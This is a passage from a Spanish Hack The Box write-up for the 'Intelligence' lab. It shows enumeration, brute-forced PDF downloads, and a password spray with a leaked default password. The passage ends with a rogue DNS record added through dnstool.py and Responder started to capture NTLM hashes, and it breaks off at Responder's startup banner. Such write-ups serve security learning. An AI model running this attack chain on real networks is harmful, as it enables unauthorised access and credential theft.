---
title: HackTheBox - Intelligence
published: true
---

## [](#header-2)Introduccion

"Intelligence" comienza con la fuerza bruta de nombres de archivos PDF predecibles y su descarga, exponiendo así una contraseña predeterminada. 
Además, los datos EXIF del PDF descargado contenían los nombres de usuario en la máquina objetivo. Podemos intentar un ataque de Password Spry con Crakmapexec 
para descifrar la primera cuenta.

Una vez que obtengamos una base inicial, notaremos que hay un script de powershell que se ejecuta cada cinco minutos, que detecta si algún 
servidor web está caído en el dominio objetivo. Podemos usar la herramienta dnstool de impacket para agregarnos al dominio y luego usar 
responder para interceptar los hashes del usuario Ted.Grave y descifrarlo.

Una vez que tengamos la contraseña de Ted.Graves, podemos continuar la enumeración y descubrir que la máquina está configurada con delegación restringida. 
Luego podemos volcar el hash del gMSA utilizando gMSA dumper y usarlo para hacerse pasar por el administrador y rootear la máquina.

## [](#header-2)Reconocimiento

- nmap

       nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.248 -oG ports
       PORT      STATE SERVICE          REASON
       53/tcp    open  domain           syn-ack ttl 127
       80/tcp    open  http             syn-ack ttl 127
       88/tcp    open  kerberos-sec     syn-ack ttl 127
       135/tcp   open  msrpc            syn-ack ttl 127
       139/tcp   open  netbios-ssn      syn-ack ttl 127
       389/tcp   open  ldap             syn-ack ttl 127
       445/tcp   open  microsoft-ds     syn-ack ttl 127
       464/tcp   open  kpasswd5         syn-ack ttl 127
       593/tcp   open  http-rpc-epmap   syn-ack ttl 127
       636/tcp   open  ldapssl          syn-ack ttl 127
       3268/tcp  open  globalcatLDAP    syn-ack ttl 127
       3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
       5985/tcp  open  wsman            syn-ack ttl 127
       9389/tcp  open  adws             syn-ack ttl 127
       49667/tcp open  unknown          syn-ack ttl 127
       49691/tcp open  unknown          syn-ack ttl 127
       49692/tcp open  unknown          syn-ack ttl 127
       49702/tcp open  unknown          syn-ack ttl 127
       49714/tcp open  unknown          syn-ack ttl 127

Una vez teniendo los puertos identificados vamos a ver que servicios corren
en cada uno y encontrar un vector de ataque.

     nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49691,49692,49702,49714 10.10.10.248 -oN scanports

     PORT      STATE SERVICE       VERSION
     53/tcp    open  domain        Simple DNS Plus
     80/tcp    open  http          Microsoft IIS httpd 10.0
     |_http-server-header: Microsoft-IIS/10.0
     | http-methods: 
     |_  Potentially risky methods: TRACE
     |_http-title: Intelligence
     88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-15 18:50:58Z)
     135/tcp   open  msrpc         Microsoft Windows RPC
     139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
     389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
     |_ssl-date: 2023-03-15T18:52:33+00:00; +7h00m00s from scanner time.
     | ssl-cert: Subject: commonName=dc.intelligence.htb
     | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
     | Not valid before: 2021-04-19T00:43:16
     |_Not valid after:  2022-04-19T00:43:16
     445/tcp   open  microsoft-ds?
     464/tcp   open  kpasswd5?
     593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
     636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
     |_ssl-date: 2023-03-15T18:52:34+00:00; +7h00m00s from scanner time.
     | ssl-cert: Subject: commonName=dc.intelligence.htb
     | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
     | Not valid before: 2021-04-19T00:43:16
     |_Not valid after:  2022-04-19T00:43:16
     3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
     |_ssl-date: 2023-03-15T18:52:33+00:00; +7h00m00s from scanner time.
     | ssl-cert: Subject: commonName=dc.intelligence.htb
     | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
     | Not valid before: 2021-04-19T00:43:16
     |_Not valid after:  2022-04-19T00:43:16
     3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
     |_ssl-date: 2023-03-15T18:52:34+00:00; +7h00m00s from scanner time.
     | ssl-cert: Subject: commonName=dc.intelligence.htb
     | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
     | Not valid before: 2021-04-19T00:43:16
     |_Not valid after:  2022-04-19T00:43:16
     5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
     |_http-title: Not Found
     |_http-server-header: Microsoft-HTTPAPI/2.0
     9389/tcp  open  mc-nmf        .NET Message Framing
     49667/tcp open  msrpc         Microsoft Windows RPC
     49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
     49692/tcp open  msrpc         Microsoft Windows RPC
     49702/tcp open  msrpc         Microsoft Windows RPC
     49714/tcp open  msrpc         Microsoft Windows RPC
     Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

     Host script results:
     | smb2-time: 
     |   date: 2023-03-15T18:51:56
     |_  start_date: N/A
     |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
     | smb2-security-mode: 
     |   311: 
     |_    Message signing enabled and required

# [](hedaer-2)Reconocmiento con crackmapexec

     SMB     10.10.10.248    445    DC    [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)

nos muestra que nos estamos enfrentando a un DC Windows 10 con el dominio intelligence.htb, colocamos el dominio en el /etc/hosts
para que en futuros ataques no nos salte algun error

# [](header-2)Reconocimiento por smbmap

     smbmap -H 10.10.10.248 -u "null"
     [!] Authentication error on 10.10.10.248

no logramos ver nada 

## [](header-2)Reconocimiento por rpcclient

     rpcclient -U "" 10.10.10.248 -N
     rpcclient $> enumdomusers
     result was NT_STATUS_ACCESS_DENIED

tampoco logramos ver nada

## [](header-2)Reconocimiento por smbclient

     smbclient -L \\\\10.10.10.248
     Password for [WORKGROUP\root]:
     Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
     Reconnecting with SMB1 for workgroup listing.
     do_connect: Connection to 10.10.10.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
     Unable to connect with SMB1 -- no workgroup available

tampoco tuvimos exito con smbclient

## [](hedaer-2)Reconocimiento Web

     whatweb http://10.10.10.248
     Bootstrap, Country[RESERVED][ZZ], Email[contact@intelligence.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.248], JQuery, Microsoft-IIS[10.0], Script, Title[Intelligence]

logramos ver un email con el dominio de la empresa

     feroxbuster 
     feroxbuster -u http://intelligence.htb

      ___  ___  __   __     __      __         __   ___
     |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
     |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
     by Ben "epi" Risher 🤓                 ver: 2.7.3
     ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://intelligence.htb
     🚀  Threads               │ 50
     📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.7.3
     💉  Config File           │ /etc/feroxbuster/ferox-config.toml
     🏁  HTTP methods          │ [GET]
     🔃  Recursion Depth       │ 4
     🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
     ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Management Menu™
     ──────────────────────────────────────────────────
     200      GET      129l      430w     7432c http://intelligence.htb/
     301      GET        2l       10w      157c http://intelligence.htb/documents => http://intelligence.htb/documents/
     301      GET        2l       10w      157c http://intelligence.htb/Documents => http://intelligence.htb/Documents/
     301      GET        2l       10w      157c http://intelligence.htb/DOCUMENTS => http://intelligence.htb/DOCUMENTS/
     [####################] - 2m    120000/120000  0s      found:4       errors:0      
     [####################] - 1m     30000/30000   272/s   http://intelligence.htb/ 
     [####################] - 1m     30000/30000   276/s   http://intelligence.htb/documents/ 
     [####################] - 1m     30000/30000   276/s   http://intelligence.htb/Documents/ 
     [####################] - 1m     30000/30000   276/s   http://intelligence.htb/DOCUMENTS/

encontramos la carpeta /documents pero no podemos tener acceso mediante Directory Listing asi que
enumerando la pagina web encontramos dos archivos (PDF), vamos a traerlos a nuestra maquina con wget

     wget http://intelligence.htb/documents/2020-12-15-upload.pdf
     wget http://intelligence.htb/documents/2020-01-01-upload.pdf

vamos a ver si contiene algo importante dentro de los metadatos que esconde cualquier archivo

     ❯ exiftool 2020-01-01-upload.pdf
     ExifTool Version Number         : 12.55
     File Name                       : 2020-01-01-upload.pdf
     Directory                       : .
     File Size                       : 27 kB
     File Modification Date/Time     : 2021:04:01 19:00:00+02:00
     File Access Date/Time           : 2023:03:15 13:21:44+01:00
     File Inode Change Date/Time     : 2023:03:15 13:21:44+01:00
     File Permissions                : -rw-r--r--
     File Type                       : PDF
     File Type Extension             : pdf
     MIME Type                       : application/pdf
     PDF Version                     : 1.5
     Linearized                      : No
     Page Count                      : 1
     Creator                         : William.Lee
                                                                                                                                                                                                                 
     ❯ exiftool 2020-12-15-upload.pdf
     ExifTool Version Number         : 12.55
     File Name                       : 2020-12-15-upload.pdf
     Directory                       : .
     File Size                       : 27 kB
     File Modification Date/Time     : 2021:04:01 19:00:00+02:00
     File Access Date/Time           : 2023:03:15 13:22:04+01:00
     File Inode Change Date/Time     : 2023:03:15 13:22:04+01:00
     File Permissions                : -rw-r--r--
     File Type                       : PDF
     File Type Extension             : pdf
     MIME Type                       : application/pdf
     PDF Version                     : 1.5
     Linearized                      : No
     Page Count                      : 1
     Creator                         : Jose.Williams

encontramos dos usuarios William.Lee y Jose.Williams, ya sabemos que cuando tenenmos posibles 
usuarios del dominio vamos a validarlos con kerbrute porque tenemos el puerto 88 abierto que pertenece a kerberos

    ./kerbrute_linux_amd64 userenum --dc 10.10.10.248 -d intelligence.htb users
    
        __             __               __     
       / /_____  _____/ /_  _______  __/ /____ 
      / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
     / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
    /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

     Version: v1.0.3 (9dad6e1) - 03/15/23 - Ronnie Flathers @ropnop

     2023/03/15 13:31:03 >  Using KDC(s):
     2023/03/15 13:31:03 >   10.10.10.248:88

     2023/03/15 13:31:03 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
     2023/03/15 13:31:03 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb

ya tenemos 2 usuarios validos del dominio pero no son asreproasteables

## [](header-2)Bash Script

con este one liner en bash vamos a poder descargarnos todos los PDFs que existen en la carpeta documents, porque desde la pagina web
no nos deja entrar y ver los archivos


     for i in {2020..2022}; do for j in {1..12}; do for k in {01..31}; do echo "http://10.10.10.248/documents/$i-$j-$k-upload.pdf"; done; done; done | xargs -n 1 -P 20 wget

     ❯ ll
     total 368
     -rw-r--r-- 1 root root 11248 abr  1  2021 2020-10-05-upload.pdf
     -rw-r--r-- 1 root root 27196 abr  1  2021 2020-10-19-upload.pdf
     -rw-r--r-- 1 root root 26599 abr  1  2021 2020-11-01-upload.pdf
     -rw-r--r-- 1 root root 25568 abr  1  2021 2020-11-03-upload.pdf
     -rw-r--r-- 1 root root 25964 abr  1  2021 2020-11-06-upload.pdf
     -rw-r--r-- 1 root root 25472 abr  1  2021 2020-11-10-upload.pdf
     -rw-r--r-- 1 root root 26461 abr  1  2021 2020-11-11-upload.pdf
     -rw-r--r-- 1 root root 11074 abr  1  2021 2020-11-13-upload.pdf
     -rw-r--r-- 1 root root 11412 abr  1  2021 2020-11-24-upload.pdf
     -rw-r--r-- 1 root root 27286 abr  1  2021 2020-11-30-upload.pdf
     -rw-r--r-- 1 root root 26762 abr  1  2021 2020-12-10-upload.pdf
     -rw-r--r-- 1 root root 27242 abr  1  2021 2020-12-15-upload.pdf
     -rw-r--r-- 1 root root 11902 abr  1  2021 2020-12-20-upload.pdf
     -rw-r--r-- 1 root root 26825 abr  1  2021 2020-12-24-upload.pdf
     -rw-r--r-- 1 root root 11480 abr  1  2021 2020-12-28-upload.pdf
     -rw-r--r-- 1 root root 25109 abr  1  2021 2020-12-30-upload.pdf
     
estos son todos los pdf que obtuvimos
                                                                                                                                                                                                                 
     ❯ exiftool *.pdf | grep "Creator"
     Creator                         : Anita.Roberts
     Creator                         : Teresa.Williamson
     Creator                         : Kaitlyn.Zimmerman
     Creator                         : Jose.Williams
     Creator                         : Stephanie.Young
     Creator                         : Samuel.Richardson
     Creator                         : Tiffany.Molina
     Creator                         : Ian.Duncan
     Creator                         : Kelly.Long
     Creator                         : Travis.Evans
     Creator                         : Ian.Duncan
     Creator                         : Jose.Williams
     Creator                         : David.Wilson
     Creator                         : Thomas.Hall
     Creator                         : Ian.Duncan
     Creator                         : Jason.Patterson

podemos enumerar por los usuarios
                                                                                                                                                                                                                 
     ❯ exiftool *.pdf | grep "Creator" | awk 'NF{print $NF}'
     Anita.Roberts
     Teresa.Williamson
     Kaitlyn.Zimmerman
     Jose.Williams
     Stephanie.Young
     Samuel.Richardson
     Tiffany.Molina
     Ian.Duncan
     Kelly.Long
     Travis.Evans
     Ian.Duncan
     Jose.Williams
     David.Wilson
     Thomas.Hall
     Ian.Duncan
     Jason.Patterson

obtuvimos mas usuarios que vamos a validar con kerbrute, y tambien todos estos usuarios son validos del DC

## [](header-2)Bash Script

no podemos ver el contenido de los archivos pdf asique vamos a utilizar la herramienta pdftotext para pasarlos a archivos .txt

     for file in $(ls); do echo $file; done | grep -v users | while read filename; do pdftotext $filename; done

     -rw-r--r-- 1 root root   206 mar 15 14:35 2020-06-04-upload.txt
     -rw-r--r-- 1 root root    34 mar 15 14:29 2020-10-05-upload.txt
     -rw-r--r-- 1 root root   724 mar 15 14:29 2020-10-19-upload.txt
     -rw-r--r-- 1 root root   730 mar 15 14:29 2020-11-01-upload.txt
     -rw-r--r-- 1 root root   447 mar 15 14:29 2020-11-03-upload.txt
     -rw-r--r-- 1 root root   616 mar 15 14:29 2020-11-06-upload.txt
     -rw-r--r-- 1 root root   397 mar 15 14:29 2020-11-10-upload.txt
     -rw-r--r-- 1 root root   742 mar 15 14:29 2020-11-11-upload.txt
     -rw-r--r-- 1 root root    36 mar 15 14:29 2020-11-13-upload.txt
     -rw-r--r-- 1 root root    48 mar 15 14:29 2020-11-24-upload.txt
     -rw-r--r-- 1 root root   712 mar 15 14:29 2020-11-30-upload.txt
     -rw-r--r-- 1 root root   867 mar 15 14:29 2020-12-10-upload.txt
     -rw-r--r-- 1 root root   996 mar 15 14:29 2020-12-15-upload.txt
     -rw-r--r-- 1 root root    49 mar 15 14:29 2020-12-20-upload.txt
     -rw-r--r-- 1 root root   885 mar 15 14:29 2020-12-24-upload.txt
     -rw-r--r-- 1 root root    44 mar 15 14:29 2020-12-28-upload.txt
     -rw-r--r-- 1 root root   271 mar 15 14:29 2020-12-30-upload.txt

borramos todos los pdf asi trabajamos de manera limpia 

     rm -r *.pdf

enumeramos uno por uno y encontramos posibles credenciales

     ❯ batcat 2020-06-04-upload.txt
     ───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
            │ File: 2020-06-04-upload.txt
     ───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
        1   │ New Account Guide
        2   │ Welcome to Intelligence Corp!
        3   │ Please login using your username and the default password of:
        4   │ NewIntelligenceCorpUser9876
        5   │ After logging in please change your password as soon as possible.
        6   │ 
        7   │ ^L

## [](header-2)Crackmapexec Password Spry

     crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876 --continue-on-succes
     SMB    10.10.10.248    445    DC      [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
     SMB    10.10.10.248    445    DC      [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
     SMB    10.10.10.248    445    DC      [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE

     crackmapexec smb 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876'
     SMB    10.10.10.248    445    DC      [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
     SMB    10.10.10.248    445    DC      [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876

## [](header-2)Enumeracion User Tiffany.Molina SMBMAP

     ❯ smbmap -H 10.10.10.248 -u "Tiffany.Molina" -p "NewIntelligenceCorpUser9876"
     [+] IP: 10.10.10.248:445        Name: intelligence.htb                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
                                                                                                                                                                                                                 
     ❯ smbmap -H 10.10.10.248 -u "Tiffany.Molina" -p "NewIntelligenceCorpUser9876" -r Users
     [+] IP: 10.10.10.248:445        Name: intelligence.htb                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Users                                                   READ ONLY
        .\Users\*
        dw--w--w--                0 Mon Apr 19 03:20:26 2021    .
        dw--w--w--                0 Mon Apr 19 03:20:26 2021    ..
        dr--r--r--                0 Mon Apr 19 02:18:39 2021    Administrator
        dr--r--r--                0 Mon Apr 19 05:16:30 2021    All Users
        dw--w--w--                0 Mon Apr 19 04:17:40 2021    Default
        dr--r--r--                0 Mon Apr 19 05:16:30 2021    Default User
        fr--r--r--              174 Mon Apr 19 05:15:17 2021    desktop.ini
        dw--w--w--                0 Mon Apr 19 02:18:39 2021    Public
        dr--r--r--                0 Mon Apr 19 03:20:26 2021    Ted.Graves
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Tiffany.Molina
                                                                                                                                                                                                                 
     ❯ smbmap -H 10.10.10.248 -u "Tiffany.Molina" -p "NewIntelligenceCorpUser9876" -r Users/Tiffany.Molina
     [+] IP: 10.10.10.248:445        Name: intelligence.htb                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Users                                                   READ ONLY
        .\UsersTiffany.Molina\*
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    .
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    ..
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    AppData
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Application Data
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Cookies
        dw--w--w--                0 Mon Apr 19 02:51:46 2021    Desktop
        dw--w--w--                0 Mon Apr 19 02:51:46 2021    Documents
        dw--w--w--                0 Mon Apr 19 02:51:46 2021    Downloads
        dw--w--w--                0 Mon Apr 19 02:51:46 2021    Favorites
        dw--w--w--                0 Mon Apr 19 02:51:46 2021    Links
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Local Settings
        dw--w--w--                0 Mon Apr 19 02:51:46 2021    Music
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    My Documents
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    NetHood
        fr--r--r--           131072 Mon Apr 19 02:51:46 2021    NTUSER.DAT
        fr--r--r--            86016 Mon Apr 19 02:51:46 2021    ntuser.dat.LOG1
        fr--r--r--                0 Mon Apr 19 02:51:46 2021    ntuser.dat.LOG2
        fr--r--r--            65536 Mon Apr 19 02:51:46 2021    NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf
        fr--r--r--           524288 Mon Apr 19 02:51:46 2021    NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms
        fr--r--r--           524288 Mon Apr 19 02:51:46 2021    NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms
        fr--r--r--               20 Mon Apr 19 02:51:46 2021    ntuser.ini
        dw--w--w--                0 Mon Apr 19 02:51:46 2021    Pictures
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Recent
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Saved Games
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    SendTo
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Start Menu
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Templates
        dw--w--w--                0 Mon Apr 19 02:51:46 2021    Videos
                                                                                                                                                                                                                 
     ❯ smbmap -H 10.10.10.248 -u "Tiffany.Molina" -p "NewIntelligenceCorpUser9876" -r Users/Tiffany.Molina/Desktop
     [+] IP: 10.10.10.248:445        Name: intelligence.htb                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Users                                                   READ ONLY
        .\UsersTiffany.Molina\Desktop\*
        dw--w--w--                0 Mon Apr 19 02:51:46 2021    .
        dw--w--w--                0 Mon Apr 19 02:51:46 2021    ..
        fw--w--w--               34 Wed Mar 15 21:55:35 2023    user.txt
                                                                                                                                                                                                                 
     ❯ smbmap -H 10.10.10.248 -u "Tiffany.Molina" -p "NewIntelligenceCorpUser9876" --download Users/Tiffany.Molina/Desktop/user.txt
     [+] Starting download: Users\Tiffany.Molina\Desktop\user.txt (34 bytes)
     [+] File output to: /home/atreus/HTB/intelligence/content/10.10.10.248-Users_Tiffany.Molina_Desktop_user.txt

Tambien anteriormente vimos algo raro, habia una carpeta llamada IT.. tambien vamos a enumerarla

     ❯ smbmap -H 10.10.10.248 -u "Tiffany.Molina" -p "NewIntelligenceCorpUser9876"
     [+] IP: 10.10.10.248:445        Name: intelligence.htb                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
                                                                                                                                                                                                                 
     ❯ smbmap -H 10.10.10.248 -u "Tiffany.Molina" -p "NewIntelligenceCorpUser9876" -r IT
     [+] IP: 10.10.10.248:445        Name: intelligence.htb                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        IT                                                      READ ONLY
        .\IT\*
        dr--r--r--                0 Mon Apr 19 02:50:58 2021    .
        dr--r--r--                0 Mon Apr 19 02:50:58 2021    ..
        fr--r--r--             1046 Mon Apr 19 02:50:58 2021    downdetector.ps1

encontramos algo raro como el downdetector.ps1, asique vamos a descargarlo en nuestra maquina con --download
                                                                                                                                                                                                                 
     ❯ smbmap -H 10.10.10.248 -u "Tiffany.Molina" -p "NewIntelligenceCorpUser9876" --download IT/downdetector.ps1
     [+] Starting download: IT\downdetector.ps1 (1046 bytes)
     [+] File output to: /home/atreus/HTB/intelligence/content/10.10.10.248-IT_downdetector.ps1 

	Import-Module ActiveDirectory foreach($record in Get-ChildItem 
        "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" 
        | Where-Object Name -like "web*")  {
    	   try {
              $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
              if(.StatusCode -ne 200) {
            	Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
              }
    	    } catch {}
	}

este script en powershell downdetector.ps1 tiene como objetivo comprobar el estado de los sitios web alojados en los servidores
AD de un dominio en particular y enviar notificaciones por correo electronico si alguno de ellos no esta en linea, la notificacion 
le llega a Ted.Graves@intelligence.htb


## [](header-2)dnstool.py

Este script primero recopila cada nombre de dominio que comienza con "web" y verifica si están activos enviándoles una solicitud web. 
La parte interesante aquí es que este script utiliza la bandera "-UseDefaultCredentials" de Invoke-WebRequest. Esto significa que la 
solicitud web envía las credenciales del usuario actual junto con la solicitud web para la autenticación.

Por lo tanto, en teoría, si podemos agregar un registro DNS que comience con "web", que apunte a una máquina que controlamos, 
¡podríamos obtener potencialmente el hash NTLM del usuario que ejecuta el script!

Investigué formas de agregar un registro DNS al Controlador de Dominio y encontré un script de Python llamado dnstool.py en la herramienta krbrelayx.

Sincronización de tiempo con DC usando Ntpdate

Pero antes de interactuar con Kerberos, debemos asegurarnos de que la hora de nuestra máquina esté sincronizada con la máquina objetivo. 
En general, podemos utilizar cosas como la salida de Nmap, la cabecera HTTP, etc., para determinar la hora del objetivo y cambiar 
la hora de nuestra máquina con el comando de fecha.

Pero, dado que estamos tratando con un Controlador de Dominio, la sincronización de tiempo es bastante simple. 
Dado que es un DC, tendrá un servicio NTP y podemos utilizar el siguiente comando para sincronizar automáticamente la hora de nuestra máquina con la del DC

- Podemos aprovecharnos de ese script para colarnos como dominio o webatreus.intelligence.htb, la maquina siempre leera dominios que empiecen con
la palabra "web" 

       ❯ python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r webatreus -a add -t A -d 10.10.16.2 10.10.10.248
       [-] Connecting to host...
       [-] Binding to host
       [+] Bind OK
       [-] Adding new record
       [+] LDAP operation completed successfully

y con el responder capturar trafico sensible como los hashes NTLMv2

     ❯ responder -I tun0
                                              __
       .----.-----.-----.-----.-----.-----.--|  |.-----.----.
       |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
       |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                        |__|

                NBT-NS, LLMNR & MDNS Responder 3.1.3.0

       To support this project:
       Patreon -> https://www.patreon.com/PythonResponder
       Paypal  -> https://paypal.me/PythonResponder

       Author: Laurent Gaffie (laurent.gaffie@gmail.com)
       To kill this script hit CTRL-C


     [+] Poisoners:
     LLMNR                      [ON]
     NBT-NS                     [ON]
     MDNS                       [ON]
     DNS                        [ON]
     DHCP                       [OFF]

     [+] Servers:
     HTTP server                [ON]
     HTTPS server               [ON]
     WPAD proxy                 [OFF]
     Auth proxy                 [OFF]
     SMB server                 [ON]
     Kerberos server            [ON]
     SQL server                 [ON]
     FTP server                 [ON]
     IMAP server                [ON]
     POP3 server                [ON]
     SMTP server                [ON]
     DNS server                 [ON]
     LDAP server                [ON]
     RDP server                 [ON]
     DCE-RPC server             [ON]
     WinRM server               [ON]

     [+] HTTP Options:
     Always serving EXE         [OFF]
     Serving EXE                [OFF]
     Serving HTML               [OFF]
     Upstream Proxy             [OFF]

     [+] Poisoning Options:
     Analyze Mode               [OFF]
     Force WPAD auth            [OFF]
     Force Basic Auth           [OFF]
     Force LM downgrade         [OFF]
     Force ESS downgrade        [OFF]

     [+] Generic Options:
     Responder NIC              [tun0]
     Responder IP               [10.10.16.2]
     Responder IPv6             [dead:beef:4::1000]
     Challenge set              [random]
     Don't Respond To Names     ['ISATAP']

     [+] Current Session Variables:
     Responder Machine Name     [WIN-91UK7F1RWND]
     Responder Domain Name      [055T.LOCAL]
